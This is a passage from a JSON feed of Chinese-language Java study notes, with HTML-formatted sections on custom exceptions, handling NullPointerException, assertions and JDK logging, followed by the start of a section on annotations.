<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>age <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在一个大型项目中，可以自定义新的异常类型，但是，保持一个合理的异常继承体系是非常重要的。</p>\n<p>一个常见的做法是自定义一个<code>BaseException</code>作为“根异常”，然后，派生出各种业务类型的异常。</p>\n<p><code>BaseException</code>需要从一个适合的<code>Exception</code>派生，通常建议从<code>RuntimeException</code>派生：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">BaseException</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">RuntimeException</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>其他业务类型的异常就可以从<code>BaseException</code>派生：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">UserNotFoundException</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">BaseException</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">LoginFailedException</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">BaseException</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n</code></pre></div><p>自定义的<code>BaseException</code>应该提供多个构造方法：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">BaseException</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">RuntimeException</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">BaseException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">BaseException</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> message<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Throwable</span> cause<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">,</span> cause<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">BaseException</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> message<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">BaseException</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Throwable</span> cause<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>cause<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上述构造方法实际上都是原样照抄<code>RuntimeException</code>。这样，抛出异常的时候，就可以选择合适的构造方法。通过IDE可以根据父类快速生成子类的构造方法。</p>\n<h2>NullPointerException</h2>\n<p><code>NullPointerException</code>即空指针异常，俗称NPE。如果一个对象为<code>null</code>，调用其方法或访问其字段就会产生<code>NullPointerException</code>，这个异常通常是由JVM抛出的，例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// NullPointerException</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>指针这个概念实际上源自C语言，Java语言中并无指针。我们定义的变量实际上是引用，Null Pointer更确切地说是Null Reference，不过两者区别不大。</p>\n<h3>处理NullPointerException</h3>\n<p>如果遇到<code>NullPointerException</code>，我们应该如何处理？首先，必须明确，<code>NullPointerException</code>是一种代码逻辑错误，遇到<code>NullPointerException</code>，遵循原则是早暴露，早修复，严禁使用<code>catch</code>来隐藏这种编码错误：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 错误示例: 捕获NullPointerException</span>\n<span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">transferMoney</span><span class=\"token punctuation\">(</span>from<span class=\"token punctuation\">,</span> <span class=\"token keyword\">to</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NullPointerException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>好的编码习惯可以极大地降低<code>NullPointerException</code>的产生，例如：</p>\n<p>成员变量在定义时初始化：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>使用空字符串<code>\"\"</code>而不是默认的<code>null</code>可避免很多<code>NullPointerException</code>，编写业务逻辑时，用空字符串<code>\"\"</code>表示未填写比<code>null</code>安全得多。</p>\n<p>返回空字符串<code>\"\"</code>、空数组而不是<code>null</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">readLinesFromFile</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> file<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getFileSize</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 返回空数组而不是null:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这样可以使得调用方无需检查结果是否为<code>null</code>。</p>\n<p>如果调用方一定要根据<code>null</code>判断，比如返回<code>null</code>表示文件不存在，那么考虑返回<code>Optional&lt;T&gt;</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token class-name\">Optional</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token function\">readFromFile</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> file<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">fileExist</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Optional</span><span class=\"token punctuation\">.</span><span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这样调用方必须通过<code>Optional.isPresent()</code>判断是否有结果。</p>\n<h3>定位NullPointerException</h3>\n<p>如果产生了<code>NullPointerException</code>，例如，调用<code>a.b.c.x()</code>时产生了<code>NullPointerException</code>，原因可能是：</p>\n<ul>\n<li><code>a</code>是<code>null</code>；</li>\n<li><code>a.b</code>是<code>null</code>；</li>\n<li><code>a.b.c</code>是<code>null</code>；</li>\n</ul>\n<p>确定到底是哪个对象是<code>null</code>以前只能打印这样的日志：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">.</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>从Java 14开始，如果产生了<code>NullPointerException</code>，JVM可以给出详细的信息告诉我们<code>null</code>对象到底是谁。我们来看例子：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">.</span>city<span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> name <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Address</span> address <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Address</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Address</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">String</span> city<span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> street<span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> zipcode<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>可以在<code>NullPointerException</code>的详细信息中看到类似<code>... because \"&lt;local1&gt;.address.city\" is null</code>，意思是<code>city</code>字段为<code>null</code>，这样我们就能快速定位问题所在。</p>\n<p>这种增强的<code>NullPointerException</code>详细信息是Java 14新增的功能，但默认是关闭的，我们可以给JVM添加一个<code>-XX:+ShowCodeDetailsInExceptionMessages</code>参数启用它：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">java</span> <span class=\"token parameter variable\">-XX:+ShowCodeDetailsInExceptionMessages</span> Main.java\n</code></pre></div><h2>使用断言</h2>\n<p>断言（Assertion）是一种调试程序的方式。在Java中，使用<code>assert</code>关键字来实现断言。</p>\n<p>我们先看一个例子：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">double</span> x <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">abs</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">123.45</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">assert</span> x <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>语句<code>assert x &gt;= 0;</code>即为断言，断言条件<code>x &gt;= 0</code>预期为<code>true</code>。如果计算结果为<code>false</code>，则断言失败，抛出<code>AssertionError</code>。</p>\n<p>使用<code>assert</code>语句时，还可以添加一个可选的断言消息：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">assert</span> x <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"x must &gt;= 0\"</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>这样，断言失败的时候，<code>AssertionError</code>会带上消息<code>x must &gt;= 0</code>，更加便于调试。</p>\n<p>Java断言的特点是：断言失败时会抛出<code>AssertionError</code>，导致程序结束退出。因此，断言不能用于可恢复的程序错误，只应该用于开发和测试阶段。</p>\n<p>对于可恢复的程序错误，不应该使用断言。例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">void</span> <span class=\"token function\">sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> arr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">assert</span> arr <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>应该抛出异常并在上层捕获：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">void</span> <span class=\"token function\">sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> arr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>arr <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"array cannot be null\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>当我们在程序中使用<code>assert</code>时，例如，一个简单的断言：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// assert</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">int</span> x <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assert</span> x <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>断言<code>x</code>必须大于<code>0</code>，实际上<code>x</code>为<code>-1</code>，断言肯定失败。执行上述代码，发现程序并未抛出<code>AssertionError</code>，而是正常打印了<code>x</code>的值。</p>\n<p>这是怎么回事？为什么<code>assert</code>语句不起作用？</p>\n<p>这是因为JVM默认关闭断言指令，即遇到<code>assert</code>语句就自动忽略了，不执行。</p>\n<p>要执行<code>assert</code>语句，必须给Java虚拟机传递<code>-enableassertions</code>（可简写为<code>-ea</code>）参数启用断言。所以，上述程序必须在命令行下运行才有效果：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>$ <span class=\"token function\">java</span> <span class=\"token parameter variable\">-ea</span> Main.java\nException <span class=\"token keyword\">in</span> thread <span class=\"token string\">\"main\"</span> java.lang.AssertionError\n\tat Main.main<span class=\"token punctuation\">(</span>Main.java:5<span class=\"token punctuation\">)</span>\n</code></pre></div><p>还可以有选择地对特定地类启用断言，命令行参数是：<code>-ea:com.itranswarp.sample.Main</code>，表示只对<code>com.itranswarp.sample.Main</code>这个类启用断言。</p>\n<p>或者对特定地包启用断言，命令行参数是：<code>-ea:com.itranswarp.sample...</code>（注意结尾有3个<code>.</code>），表示对<code>com.itranswarp.sample</code>这个包启动断言。</p>\n<p>实际开发中，很少使用断言。更好的方法是编写单元测试，后续我们会讲解<code>JUnit</code>的使用。</p>\n<h2>Logging</h2>\n<h3>使用JDK Logging</h3>\n<p>日志就是Logging，它的目的是为了取代<code>System.out.println()</code>。</p>\n<p>输出日志，而不是用<code>System.out.println()</code>，有以下几个好处：</p>\n<ol>\n<li>可以设置输出样式，避免自己每次都写<code>\"ERROR: \" + var</code>；</li>\n<li>可以设置输出级别，禁止某些级别输出。例如，只输出错误日志；</li>\n<li>可以被重定向到文件，这样可以在程序运行结束后查看日志；</li>\n<li>可以按包名控制日志级别，只输出某些包打的日志；</li>\n<li>可以……</li>\n</ol>\n<p>因为Java标准库内置了日志包<code>java.util.logging</code>，我们可以直接用。先看一个简单的例子：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// logging</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>logging<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Level</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>logging<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Logger</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Logger</span> logger <span class=\"token operator\">=</span> <span class=\"token class-name\">Logger</span><span class=\"token punctuation\">.</span><span class=\"token function\">getGlobal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        logger<span class=\"token punctuation\">.</span><span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"start process...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        logger<span class=\"token punctuation\">.</span><span class=\"token function\">warning</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"memory is running out...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        logger<span class=\"token punctuation\">.</span><span class=\"token function\">fine</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ignored.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        logger<span class=\"token punctuation\">.</span><span class=\"token function\">severe</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"process will be terminated...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>运行上述代码，得到类似如下的输出：</p>\n<div class=\"language-plain\" data-ext=\"plain\" data-title=\"plain\"><pre class=\"language-plain\"><code>Mar 02, 2019 6:32:13 PM Hello main\nINFO: start process...\nMar 02, 2019 6:32:13 PM Hello main\nWARNING: memory is running out...\nMar 02, 2019 6:32:13 PM Hello main\nSEVERE: process will be terminated...\n</code></pre></div><p>对比可见，使用日志最大的好处是，它自动打印了时间、调用类、调用方法等很多有用的信息。</p>\n<p>再仔细观察发现，4条日志，只打印了3条，<code>logger.fine()</code>没有打印。这是因为，日志的输出可以设定级别。JDK的Logging定义了7个日志级别，从严重到普通：</p>\n<ul>\n<li>SEVERE</li>\n<li>WARNING</li>\n<li>INFO</li>\n<li>CONFIG</li>\n<li>FINE</li>\n<li>FINER</li>\n<li>FINEST</li>\n</ul>\n<p>因为默认级别是INFO，因此，INFO级别以下的日志，不会被打印出来。使用日志级别的好处在于，调整级别，就可以屏蔽掉很多调试相关的日志输出。</p>\n<p>使用Java标准库内置的Logging有以下局限：</p>\n<p>Logging系统在JVM启动时读取配置文件并完成初始化，一旦开始运行<code>main()</code>方法，就无法修改配置；</p>\n<p>配置不太方便，需要在JVM启动时传递参数<code>-Djava.util.logging.config.file=&lt;config-file-name&gt;</code>。</p>\n<p>因此，Java标准库内置的Logging使用并不是非常广泛。更方便的日志系统我们稍后介绍。</p>\n<blockquote>\n<p>下面的用到了再说吧</p>\n</blockquote>\n<h3>Commons Logging</h3>\n<h3>使用Log4j</h3>\n<h3>使用SLF4J和Logback</h3>\n",
      "date_published": "2024-09-11T13:20:40.000Z",
      "date_modified": "2024-09-11T13:20:40.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "6-注解",
      "url": "https://echo0d.github.io/DailyNotes/develop/Java/6_Annotation.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Java/6_Annotation.html",
      "summary": "6-注解\n使用注解\n什么是注解（Annotation）？注解是放在Java源码的类、方法、字段、参数前的一种特殊“注释”：\n注释会被编译器直接忽略，注解则可以被编译器打包进入class文件，因此，注解是一种用作标注的“元数据”。\n注解的作用\n从JVM的角度看，注解本身对代码逻辑没有任何影响，如何使用注解完全由工具决定。\nJava的注解可以分为三类：\n第...",
      "content_html": "\n<h2>使用注解</h2>\n<p>什么是注解（Annotation）？注解是放在Java源码的类、方法、字段、参数前的一种特殊“注释”：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// this is a component:</span>\n<span class=\"token annotation punctuation\">@Resource</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Inject</span>\n    <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">;</span>\n\n    <span class=\"token annotation punctuation\">@PostConstruct</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@Param</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>注释会被编译器直接忽略，注解则可以被编译器打包进入class文件，因此，注解是一种用作标注的“元数据”。</p>\n<h3>注解的作用</h3>\n<p>从JVM的角度看，注解本身对代码逻辑没有任何影响，如何使用注解完全由工具决定。</p>\n<p>Java的注解可以分为三类：</p>\n<p>第一类是由编译器使用的注解，例如：</p>\n<ul>\n<li><code>@Override</code>：让编译器检查该方法是否正确地实现了覆写；</li>\n<li><code>@SuppressWarnings</code>：告诉编译器忽略此处代码产生的警告。</li>\n</ul>\n<p>这类注解不会被编译进入<code>.class</code>文件，它们在编译后就被编译器扔掉了。</p>\n<p>第二类是由工具处理<code>.class</code>文件使用的注解，比如有些工具会在加载class的时候，对class做动态修改，实现一些特殊的功能。这类注解会被编译进入<code>.class</code>文件，但加载结束后并不会存在于内存中。这类注解只被一些底层库使用，一般我们不必自己处理。</p>\n<p>第三类是在程序运行期能够读取的注解，它们在加载后一直存在于JVM中，这也是最常用的注解。例如，一个配置了<code>@PostConstruct</code>的方法会在调用构造方法后自动被调用（这是Java代码读取该注解实现的功能，JVM并不会识别该注解）。</p>\n<p>定义一个注解时，还可以定义配置参数。配置参数可以包括：</p>\n<ul>\n<li>所有基本类型；</li>\n<li>String；</li>\n<li>枚举类型；</li>\n<li>基本类型、String、Class以及枚举的数组。</li>\n</ul>\n<p>因为配置参数必须是常量，所以，上述限制保证了注解在定义时就已经确定了每个参数的值。</p>\n<p>注解的配置参数可以有默认值，缺少某个配置参数时将使用默认值。</p>\n<p>此外，大部分注解会有一个名为<code>value</code>的配置参数，对此参数赋值，可以只写常量，相当于省略了value参数。</p>\n<p>如果只写注解，相当于全部使用默认值。</p>\n<p>举个栗子，对以下代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token 